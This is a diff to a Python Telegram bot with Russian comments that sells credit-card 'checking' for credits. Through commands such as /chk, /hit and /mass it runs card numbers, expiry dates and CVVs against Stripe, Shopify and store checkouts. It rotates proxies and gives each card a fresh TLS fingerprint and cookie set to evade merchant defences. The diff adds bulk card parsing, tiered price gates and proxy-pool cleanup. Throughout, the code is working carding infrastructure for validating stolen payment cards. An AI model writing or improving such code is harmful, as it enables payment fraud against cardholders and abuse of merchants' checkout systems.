@@ -4,6 +4,7 @@
 # Команды: /start /cmds /me /key <key> /setupwoo cc|mm|yy|cvv /piconfirm cc|mm|yy|cvv
 # Админ: /addcredits <uid> <n> /addpremium <uid> <days> /genkey <credits|days:d>
 import asyncio
+import functools
 import html
 import json
 import os
@@ -47,6 +48,7 @@ def me_line(u: dict) -> str:
 
 
 def admin_only(func):
+    @functools.wraps(func)
     async def wrapped(client, message: Message):
         if message.from_user and message.from_user.id in config.ADMIN_IDS:
             return await func(client, message)
@@ -56,6 +58,7 @@ def admin_only(func):
 
 def user_only(func):
     """Guard: в каналах/анонимных сообщениях from_user=None → тихий краш без ответа."""
+    @functools.wraps(func)
     async def wrapped(client, message: Message):
         if message.from_user is None:
             return
@@ -73,6 +76,14 @@ GATE_ALIASES = {
     "pi": "piconfirm",
     "vbv": "braintreenvbv",
     "b3": "braintreenvbv",
+}
+
+# Тир в имени команды: /st1 /st5 /st20 /sp1 /sp5 /sp20. Меню их рекламировало,
+# но хендлера не было — бот молчал: пирограм проверяет границу токена, поэтому
+# "/st1" не попадает в фильтр команды "st". Теперь это отдельные команды.
+TIERED_GATE_CMDS = {
+    "st1": ("storegate", "1"), "st5": ("storegate", "5"), "st20": ("storegate", "20"),
+    "sp1": ("shopify", "1"),   "sp5": ("shopify", "5"),   "sp20": ("shopify", "20"),
 }
 
 
@@ -105,6 +116,68 @@ def _card_fields(text: str) -> list[str] | None:
     return parts if len(parts) == 4 else None
 
 
+_PAN_RE = re.compile(r"\d{13,19}")
+_MM_RE = re.compile(r"\d{1,2}")
+_YY_RE = re.compile(r"\d{2,4}")
+_CVV_RE = re.compile(r"\d{3,4}")
+
+
+def _collect_cards(chunk: str, out: list[list[str]], limit: int,
+                   dedupe: bool = True) -> None:
+    """Из одного фрагмента вытащить карты. Сначала весь фрагмент целиком
+    (CC|MM|YY|CVV, CC MM YY CVV, 4-блочный PAN), потом жадный проход по
+    токенам — несколько карт через пробел в одной строке."""
+    def _add(c: list[str]) -> None:
+        if not dedupe or c not in out:
+            out.append(c)
+
+    if len(out) >= limit:
+        return
+    f = _card_fields(chunk)
+    if f:
+        _add(f)
+        return
+    toks = chunk.replace("|", " ").replace(":", " ").replace("/", " ").split()
+    i = 0
+    while i < len(toks) and len(out) < limit:
+        if (i + 3 < len(toks)
+                and _PAN_RE.fullmatch(toks[i]) and _MM_RE.fullmatch(toks[i + 1])
+                and _YY_RE.fullmatch(toks[i + 2]) and _CVV_RE.fullmatch(toks[i + 3])):
+            _add([toks[i], toks[i + 1], toks[i + 2], toks[i + 3]])
+            i += 4
+            continue
+        if (i + 6 < len(toks)
+                and all(re.fullmatch(r"\d{4}", t) for t in toks[i:i + 4])
+                and _MM_RE.fullmatch(toks[i + 4]) and _YY_RE.fullmatch(toks[i + 5])
+                and _CVV_RE.fullmatch(toks[i + 6])):
+            _add(["".join(toks[i:i + 4]), toks[i + 4], toks[i + 5], toks[i + 6]])
+            i += 7
+            continue
+        i += 1
+
+
+def parse_cards(text: str, limit: int = 20, dedupe: bool = True) -> list[list[str]]:
+    """Поток карт из произвольного текста: построчно, запятые между полями одной
+    карты или между картами, любой разделитель (| : / пробел), 4-блочный PAN.
+    Раньше /hit резал хвост по пробелам и скармливал каждый токен парсеру
+    поодиночке — '/hit URL 4111111111111111 12 30 123' давал ноль карт."""
+    out: list[list[str]] = []
+    for raw_line in text.splitlines():
+        line = raw_line.strip()
+        if not line:
+            continue
+        if "," in line:
+            chunks = [c.strip() for c in line.split(",") if c.strip()]
+            if len(chunks) >= 4 and all(re.fullmatch(r"[\d|:/ ]+", c) for c in chunks):
+                _collect_cards(" ".join(chunks), out, limit, dedupe)  # поля через запятую
+            else:
+                for c in chunks:
+                    _collect_cards(c, out, limit, dedupe)             # карты через запятую
+            continue
+        _collect_cards(line, out, limit, dedupe)
+    return out[:limit]
+
+
 def build_start_menu(u: dict, creator: str = CREATOR_NICK) -> str:
     is_dev = db.is_developer(u)
     is_prem = db.is_premium(u)
@@ -130,15 +203,18 @@ def build_start_menu(u: dict, creator: str = CREATOR_NICK) -> str:
         "⚡ <b>𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺</b> ⚡\n\n"
         "💳 <code>/chk</code> cc — авто-выбор поверхности\n"
         "💳 <code>/au</code> cc — Stripe $0 Auth (SetupIntent)\n"
-        "💳 <code>/st</code> [1|5|20] cc — Store API (цена: &lt;$1 / $1-5 / $5-20)\n"
-        "💳 <code>/sp</code> [1|5|20] cc — Shopify Checkout (цена: &lt;$1 / $1-5 / $5-20)\n"
+        "💳 <code>/st1</code> <code>/st5</code> <code>/st20</code> cc — Store API (тир: &lt;$1 / $1-5 / $5-20)\n"
+        "💳 <code>/sp1</code> <code>/sp5</code> <code>/sp20</code> cc — Shopify Checkout (тир: &lt;$1 / $1-5 / $5-20)\n"
         "⚡ <code>/hit</code> url cc — Stripe Checkout (готовый cs_live-линк)\n"
         "🔍 <code>/bin</code> bin — BIN Lookup\n"
         "📁 <code>/mass</code> [гейт] — Mass Check (≤20 карт, .txt или текст)\n\n"
         "🌐 <b>𝑷𝑹𝑶𝑿𝑰𝑬𝑺</b> 🌐\n\n"
-        "📡 <code>/addproxy</code> — Add proxies (text/file)\n"
         "📡 <code>/proxy</code> — Check &amp; clean proxies\n"
-        "📡 <code>/clearproxy</code> — Clear all proxies\n"
+        "📡 <code>/addproxy</code> — Add proxies (text/file) <i>— админ</i>\n"
+        "📡 <code>/clearproxy</code> — Clear all proxies <i>— админ</i>\n\n"
+        "📈 <b>𝑰𝑵𝑭𝑶</b> 📈\n\n"
+        "📊 <code>/stats</code> — твоя статистика и пул\n"
+        "🧩 <code>/gates</code> — какие гейты живы и сколько стоят\n"
         "───────────────────────\n"
         f"✈️ Made by <i>{creator}</i>"
     )
@@ -172,13 +248,67 @@ async def cmd_key(client, message: Message):
 @app.on_message(filters.command(["proxy"]))
 @user_only
 async def cmd_proxy(client, message: Message):
+    """Проверка и чистка пула. Раньше команда только печатала длину списка,
+    хотя меню обещало «Check & clean» — ProxyPool.validate_all() просто не
+    был подключён."""
     proxies = gc.load_proxies()
     if not proxies:
         return await message.reply("📡 <b>Прокси-пул:</b> пуст (прямое подключение)\nДобавить: <code>/addproxy host:port</code> или файлом.", parse_mode=ParseMode.HTML)
-    await message.reply(
-        f"📡 <b>Прокси-пул:</b> {len(proxies)} шт.\n"
-        f"• Управление: <code>/addproxy</code> (админ) | Очистить: <code>/clearproxy</code> (админ)",
-        parse_mode=ParseMode.HTML)
+
+    # validate_all держит 20 потоков по 10с — на списке из 60k это часы.
+    # Режем выборку: чистим то, что реально проверим, остальное честно не трогаем.
+    PROBE_CAP = 500
+    checked, skipped = proxies[:PROBE_CAP], proxies[PROBE_CAP:]
+
+    status = await message.reply(f"📡 Проверяю {len(checked)} прокси — probing ipify...",
+                                 parse_mode=ParseMode.HTML)
+    from proxy_manager import ProxyPool
+    pool = ProxyPool(checked)
+    fails_before = {e["url"]: e["fail_count"] for e in pool.entries}
+    try:
+        alive, _total = await pool.validate_all()
+    except Exception as e:
+        return await status.edit_text(
+            f"❌ Валидация сорвалась: <code>{html.escape(type(e).__name__)}: {html.escape(str(e)[:120])}</code>",
+            parse_mode=ParseMode.HTML)
+
+    # «мёртвый» по ProxyPool = три накопленных фейла, но для ручной чистки
+    # считаем неответивших на ЭТОЙ проверке: alive=False или fail_count вырос.
+    # Сравниваем по URL, не по словарю: два одинаковых entry дали бы ложное
+    # совпадение и выкосили бы живой прокси.
+    dead_urls = {e["url"] for e in pool.entries
+                 if not e["alive"] or e["fail_count"] > fails_before.get(e["url"], 0)}
+    alive_urls = [e["url"] for e in pool.entries if e["url"] not in dead_urls]
+
+    if dead_urls:
+        # обратно в файл — тем же форматом, что пишет /addproxy (без схемы).
+        # load_proxies() сам вернёт схему при чтении. Непроверенный хвост
+        # дописываем как есть — /proxy не должен молча терять прокси.
+        os.makedirs("data", exist_ok=True)
+        with open(os.path.join("data", "proxies.txt"), "w", encoding="utf-8") as f:
+            for url in alive_urls + skipped:
+                f.write(url.split("://", 1)[-1] + "\n")
+
+    lats = sorted(e["latency_ms"] for e in pool.entries
+                  if e["url"] not in dead_urls and e.get("latency_ms"))
+    med = lats[len(lats) // 2] if lats else 0
+    lines = [
+        f"📡 <b>Прокси-пул:</b> {len(alive_urls)}/{len(checked)} живых",
+        f"• Медиана отклика: <b>{med} ms</b>",
+        f"• Не ответили: <b>{len(dead_urls)}</b>"
+        + (" — удалены из пула" if dead_urls else ""),
+    ]
+    if skipped:
+        lines.append(f"• Не проверено (лимит {PROBE_CAP}): <b>{len(skipped)}</b> — остались в пуле")
+    # alive от ProxyPool считает по своим трём страйкам; он мягче нашей чистки,
+    # поэтому показываем обе цифры, чтобы не казалось, что они противоречат.
+    lines.append(f"• По пулу (3 страйка): <b>{alive}</b> живых")
+    if dead_urls:
+        sample = ", ".join(html.escape(u.split("://", 1)[-1]) for u in
+                           list(dead_urls)[:3])
+        lines.append(f"• Примеры: <code>{sample}</code>")
+    lines.append("• Управление: <code>/addproxy</code> (админ) | Очистить: <code>/clearproxy</code> (админ)")
+    await status.edit_text("\n".join(lines), parse_mode=ParseMode.HTML)
 
 
 @app.on_message(filters.command(["addproxy"]))
@@ -222,7 +352,21 @@ async def cmd_clearproxy(client, message: Message):
     await message.reply("🧹 Прокси-пул очищен.", parse_mode=ParseMode.HTML)
 
 
-async def run_gate(message: Message, gate_name: str, argline: str):
+def _tier_parser(gate_name: str):
+    """Таблица тиров ЦЕЛЕВОГО гейта: границы у storegate и shopify расходятся
+    (100c попадало и в тир 1, и в тир 5), валидация чужой таблицей пропускала
+    токен, который целевой гейт потом трактовал иначе."""
+    if gate_name == "shopify":
+        from bot.gates.shopify import parse_tier
+        return parse_tier
+    if gate_name == "storegate":
+        from bot.gates.storegate import parse_tier
+        return parse_tier
+    return None
+
+
+async def run_gate(message: Message, gate_name: str, argline: str,
+                   tier: str | None = None):
     u_id = message.from_user.id
     db.ensure_user(u_id, message.from_user.username or "")
     if not db.antispam_ok(u_id):
@@ -232,20 +376,19 @@ async def run_gate(message: Message, gate_name: str, argline: str):
         return await message.reply(f"❌ Гейт {gate_name} не найден")
     # ценовой тир для storegate / shopify: '/st 1|5|20 CC MM YY CVV' — первый
     # короткий токен из PRICE_TIERS, карта начинается с 13-19 цифр — не спутается.
-    # Тир разбирается таблицей ЦЕЛЕВОГО гейта: границы у storegate и shopify
-    # расходятся (100c попадало и в тир 1, и в тир 5), валидация чужой таблицей
-    # пропускала токен, который целевой гейт потом трактовал иначе.
-    tier = None
+    # Тир может прийти и в имени команды (/st1) — тогда он уже задан, а дубль
+    # в аргументах ('/st1 1 4111...') просто срезается, а не ломает разбор.
+    parser = _tier_parser(gate_name)
     toks = argline.split()
-    if toks and gate_name in ("storegate", "shopify"):
-        from bot.gates.storegate import parse_tier as _parse_tier_sg
-        from bot.gates.shopify import parse_tier as _parse_tier_sp
-        parser = _parse_tier_sp if gate_name == "shopify" else _parse_tier_sg
-        if parser(toks[0]) is not None:
+    if toks and parser is not None and parser(toks[0]) is not None:
+        if tier is None:
             tier = toks[0].lower()
-            argline = " ".join(toks[1:])
-    # формат валидируется ДО списания кредитов — кривой ввод не сжигает баланс
-    parts = _card_fields(argline)
+        argline = " ".join(toks[1:])
+    # формат валидируется ДО списания кредитов — кривой ввод не сжигает баланс.
+    # Тот же parse_cards, что в /hit и /mass: запятые в '/chk 4111...,12,30,123'
+    # раньше ломались, потому что _card_fields их не ел.
+    cards = parse_cards(argline, limit=1)
+    parts = cards[0] if cards else None
     if parts is None:
         return await message.reply(f"Формат: /{gate_name} CC MM YY CVV")
     if not gc.check_luhn("".join(ch for ch in parts[0] if ch.isdigit())):
@@ -286,7 +429,24 @@ async def run_gate(message: Message, gate_name: str, argline: str):
                                 detail, latency_ms, proxy=a_proxy, pool_size=a_pool),
         parse_mode=ParseMode.HTML)
 
-ALL_GATE_CMDS = list(GATES.keys()) + list(GATE_ALIASES.keys()) + ["chk"]
+ALL_GATE_CMDS = (list(GATES.keys()) + list(GATE_ALIASES.keys())
+                 + list(TIERED_GATE_CMDS.keys()) + ["chk"])
+
+
+def resolve_gate_cmd(cmd: str) -> tuple[str | None, str | None]:
+    """Команда → (имя гейта, форс-тир). Чистая функция: без сети и без Message,
+    поэтому её можно гонять в тестах (см. scratch/_bot_handler_probe.py)."""
+    cmd = cmd.lstrip("/").split("@")[0].lower()
+    if cmd in TIERED_GATE_CMDS:
+        return TIERED_GATE_CMDS[cmd]
+    gate_name, tier = GATE_ALIASES.get(cmd, cmd), None
+    if cmd == "chk" and "chk" not in GATES:
+        # /chk — не гейт, а авто-выбор лучшей доступной поверхности по
+        # GATE_PRIORITY (только гейты с реально настроенными целями).
+        # Без этой команды _pick_gate/_available_gates достижимы были только
+        # из /mass, хотя АУДИТ и меню на неё ссылаются.
+        gate_name = _pick_gate(None)
+    return gate_name, tier
 
 
 @app.on_message(filters.command(ALL_GATE_CMDS or ["none"]))
@@ -297,19 +457,12 @@ async def gate_dispatch(client, message: Message):
     parts = raw.split()
     if not parts:
         return
-    cmd = parts[0].lstrip("/").split("@")[0].lower()
-    gate_name = GATE_ALIASES.get(cmd, cmd)
-    if cmd == "chk" and "chk" not in GATES:
-        # /chk — не гейт, а авто-выбор лучшей доступной поверхности по
-        # GATE_PRIORITY (только гейты с реально настроенными целями).
-        # Без этой команды _pick_gate/_available_gates достижимы были только
-        # из /mass, хотя АУДИТ и меню на неё ссылаются.
-        gate_name = _pick_gate(None)
-        if not gate_name:
-            return await message.reply("Нет доступных гейтов: ни одна поверхность не настроена.")
+    gate_name, tier = resolve_gate_cmd(parts[0])
+    if parts[0].lstrip("/").split("@")[0].lower() == "chk" and not gate_name:
+        return await message.reply("Нет доступных гейтов: ни одна поверхность не настроена.")
     if gate_name in GATES:
         argline = " ".join(parts[1:])
-        await run_gate(message, gate_name, argline)
+        await run_gate(message, gate_name, argline, tier=tier)
 
 
 # --- мультигейт: порядок выбора для /mass (форс первым аргументом) ---
@@ -362,9 +515,10 @@ def _pick_gate(force: str | None) -> str | None:
 @app.on_message(filters.command(["hit"]))
 @user_only
 async def cmd_hit(client, message: Message):
-    """Stripe Checkout /hit: /hit <cs_live-url> CC|MM|YY|CVC [карта2 ...] —
+    """Stripe Checkout /hit: /hit <cs_live-url> CC MM YY CVC [карта2 ...] —
     много карт по одному линку, каждая со своей СВЕЖЕЙ HTTP-сессией
-    (разные TLS-фингерпринты/куки), пока линк жив."""
+    (разные TLS-фингерпринты/куки), пока линк жив. Разделители любые:
+    пробелы, |, :, / или запятые — как привычно по остальным командам."""
     u_id = message.from_user.id
     db.ensure_user(u_id, message.from_user.username or "")
     if not db.antispam_ok(u_id):
@@ -372,19 +526,14 @@ async def cmd_hit(client, message: Message):
     raw = (message.text or message.caption or "").split()
     if len(raw) < 3 or not raw[1].startswith("http") or "cs_" not in raw[1]:
         return await message.reply(
-            "Формат: <code>/hit &lt;cs_live-url&gt; CC|MM|YY|CVC [карта2 ...]</code> — линк любого Stripe Checkout, до 10 карт за раз",
+            "Формат: <code>/hit &lt;cs_live-url&gt; CC MM YY CVC [карта2 ...]</code> — линк любого Stripe Checkout, до 10 карт за раз",
             parse_mode=ParseMode.HTML)
     target_url = raw[1]
     # карты: остальные токены + многострочность (reply на сообщение с картами тоже работает)
     card_lines = " ".join(raw[2:])
     if "\n" in (message.text or ""):
         card_lines = (message.text or "").split("\n", 1)[1].replace(target_url, " ")
-    cards = []
-    for ln in card_lines.replace(",", " ").split():
-        f = _card_fields(ln)
-        if f and f not in cards:
-            cards.append(f)
-    cards = cards[:10]
+    cards = parse_cards(card_lines, limit=10)
     if not cards:
         return await message.reply("Карта не распознана: CC MM YY CVV")
     for f in cards:
@@ -464,13 +613,22 @@ async def cmd_mass(client, message: Message):
 
     cards_text = ""
     gate_forced = None
+    tier_forced = None
 
+    # форс гейта первым аргументом: имя, алиас (/st) или команда с тиром (/st1)
     parts = (message.text or "").split()
-    if len(parts) > 1 and GATE_ALIASES.get(parts[1], parts[1]) in GATES:
-        gate_forced = GATE_ALIASES.get(parts[1], parts[1])
-        raw_tail = " ".join(parts[2:])
+    if len(parts) > 1:
+        tok = parts[1].lower()
+        if tok in TIERED_GATE_CMDS:
+            gate_forced, tier_forced = TIERED_GATE_CMDS[tok]
+            raw_tail = " ".join(parts[2:])
+        elif GATE_ALIASES.get(tok, tok) in GATES:
+            gate_forced = GATE_ALIASES.get(tok, tok)
+            raw_tail = " ".join(parts[2:])
+        else:
+            raw_tail = " ".join(parts[1:])
     else:
-        raw_tail = " ".join(parts[1:])
+        raw_tail = ""
 
     # Check if document / reply
     if message.reply_to_message and message.reply_to_message.document:
@@ -485,32 +643,12 @@ async def cmd_mass(client, message: Message):
     if not cards_text.strip():
         return await message.reply(
             "<b>Использование массовой проверки:</b>\n"
-            "• <code>/mass [гейт] CC|MM|YY|CVV\nCC|MM|YY|CVV...</code>\n"
+            "• <code>/mass [гейт] CC MM YY CVV\nCC MM YY CVV...</code>\n"
+            "• Гейт: <code>au</code> / <code>st</code> <code>1|5|20</code> / <code>st1</code> / <code>sp20</code>\n"
             "• Или ответом на .txt файл: <code>/mass [гейт]</code>\n"
             "(Максимум 20 карт за раз)", parse_mode=ParseMode.HTML)
 
-    # запятые: между картами ИЛИ между полями одной карты — раньше глобальный
-    # replace(",", "\n") рвал "4111,1111,1111,1111,09,25,123" на мусорные строки
-    raw_lines = []
-    for ln in cards_text.splitlines():
-        ln = ln.strip()
-        if not ln:
-            continue
-        if "," in ln:
-            chunks = [c.strip() for c in ln.split(",")]
-            if len(chunks) >= 4 and all(re.fullmatch(r"[\d ]+", c) for c in chunks if c):
-                # все чанки числовые — это одна карта с запятыми между полями
-                raw_lines.append(" ".join(c for c in chunks if c))
-            else:
-                raw_lines.extend(c for c in chunks if c)  # карты через запятую
-        else:
-            raw_lines.append(ln)
-
-    valid_cards = []
-    for ln in raw_lines:
-        fields = _card_fields(ln)
-        if fields is not None:
-            valid_cards.append(fields)
+    valid_cards = parse_cards(cards_text, limit=10 ** 6, dedupe=False)
 
     if not valid_cards:
         return await message.reply("❌ Не найдено карт в подходящем формате (ожидается CC MM YY CVV).")
@@ -531,7 +669,9 @@ async def cmd_mass(client, message: Message):
     if not is_prem and u.get("credits", 0) < len(valid_cards) * cost_per:
         return await message.reply(f"❌ Недостаточно кредитов. Требуется {len(valid_cards) * cost_per} кредитов на {len(valid_cards)} карт.")
 
-    status_msg = await message.reply(f"🚀 Запуск массовой проверки ({len(valid_cards)} карт) через <b>{gate_name}</b>...", parse_mode=ParseMode.HTML)
+    status_msg = await message.reply(
+        f"🚀 Запуск массовой проверки ({len(valid_cards)} карт) через <b>{gate_label(gate_name, tier_forced)}</b>...",
+        parse_mode=ParseMode.HTML)
 
     # A5 (ИССЛЕДОВАНИЕ-СКОРОСТЬ.md): параллельный прогон вместо поочерёдного
     # с sleep 1.5с — semaphore(5) держит вежливый темп к донору (Stripe ~20
@@ -550,7 +690,13 @@ async def cmd_mass(client, message: Message):
                 return {"card": " ".join(card_parts), "status": "ERROR",
                         "detail": "Недостаточно кредитов"}
             try:
-                verdict, detail = await meta["fn"](*card_parts)
+                if tier_forced and gate_name in ("storegate", "shopify"):
+                    res = await meta["fn"](*card_parts, tier=tier_forced)
+                else:
+                    res = await meta["fn"](*card_parts)
+                # гейт волен вернуть 2 или 3 элемента — как в run_gate, а не
+                # хрупким распаковыванием в две переменные
+                verdict, detail = res[0], res[1]
             except Exception as e:
                 verdict, detail = "ERROR", f"{type(e).__name__}: {e}"[:100]
             if verdict == "ERROR":
@@ -574,7 +720,7 @@ async def cmd_mass(client, message: Message):
     if u_id in config.ADMIN_IDS:
         pool_line = f" | 📡 Пул: {len(gc.load_proxies())}"
     summary = (f"🏁 <b>Массовая проверка завершена ({len(mass_results)}/{len(valid_cards)})</b>\n"
-               f"Гейт: <code>{gate_name}</code> | Одобрено: <b>{approved_count}</b>{pool_line}\n\n"
+               f"Гейт: <code>{gate_label(gate_name, tier_forced)}</code> | Одобрено: <b>{approved_count}</b>{pool_line}\n\n"
                + formatter.format_mass(mass_results, header=False))
     # TG-лимит 4096 — режем на части по строкам
     chunk, chunks = [], []
